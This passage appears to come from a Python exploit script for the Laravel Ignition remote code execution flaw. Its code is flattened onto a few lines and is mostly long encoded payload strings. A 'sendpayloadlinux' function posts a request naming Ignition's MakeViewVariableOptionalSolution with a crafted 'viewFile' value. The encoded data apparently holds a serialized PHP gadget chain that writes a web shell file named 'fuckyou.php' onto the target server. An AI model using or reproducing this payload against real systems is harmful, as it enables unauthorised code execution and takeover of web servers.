0=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a\" } } req = requests . post ( url , headers = header , data = json . dumps ( data , indent = 1 )) return req def sendpayloadlinux ( url ): data = { \"solution\" : \"Facade \\\\ Ignition \\\\ Solutions \\\\ MakeViewVariableOptionalSolution\" , \"parameters\" : { \"variableName\" : \"username\" , \"viewFile\" : \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=